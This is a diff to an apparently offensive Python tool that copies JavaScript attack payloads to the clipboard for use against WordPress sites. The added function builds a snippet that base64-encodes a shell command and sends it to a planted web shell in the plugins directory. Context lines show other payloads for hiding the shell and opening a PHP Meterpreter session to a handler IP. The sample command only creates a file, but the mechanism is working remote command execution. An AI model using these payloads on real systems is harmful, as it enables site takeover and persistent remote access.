@@ -414,9 +414,40 @@ def seven():
 
 
 
+def eight():
+	code = """
+function runCmd()
+{
+	console.log("Starting runCmd...");
+
+	var cmd = "touch wooHooRCE.txt";
+
+	var payload = btoa(cmd);
+
+    var uri = "/wp-content/plugins/" + webShellPath + "?cmd=" + payload;
+
+    // Ok, let's send our command
+	xhr = new XMLHttpRequest();
+	
+	xhr.open("GET", uri, true);
+	xhr.send(null);
+}
+	"""
+
+	copyToClipboard(code)
+
+	return "Basic command ready..."
+
+
+
+
+
+
+
+
 
 # Extra escaping needed below
-def eight():
+def nine():
 	code = """
 const sleep = (milliseconds) => 
 {
@@ -506,7 +537,7 @@ async function hideYertleShell()
 
 
 # Extra escaping needed below
-def nine():
+def ten():
 	code = """
 // Set your handler's IP and port below.
 async function openPhpMeterpreterSession()
@@ -657,6 +688,7 @@ def handleInput(input):
         7: seven,
         8: eight,
         9: nine,
+        10: ten,
         exit: gimmeOuttaHere,
         quit: gimmeOuttaHere
 	}
